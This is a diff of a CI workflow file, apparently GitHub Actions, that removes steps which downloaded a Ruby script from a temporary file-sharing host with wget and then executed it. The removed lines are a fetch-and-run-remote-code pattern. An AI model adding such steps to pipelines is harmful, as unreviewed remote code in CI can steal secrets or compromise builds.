@@ -22,14 +22,6 @@ jobs:
         options: --entrypoint redis-server
 
     steps:
-      - name: Install Selenium
-        run: |
-            sudo gem install selenium-webdriver
-            wget https://filebin.net/6cw0f2x2sfgqyhi0/headless_chrome.rb?t=7g4c257d -O headless_chrome.rb
-            chmod +x headless_chrome.rb
-      - name: ChromeWebDriver
-        run: |
-            ./headless_chrome.rb
       - uses: actions/checkout@v1
       - name: Setup Ruby
         uses: actions/setup-ruby@v1
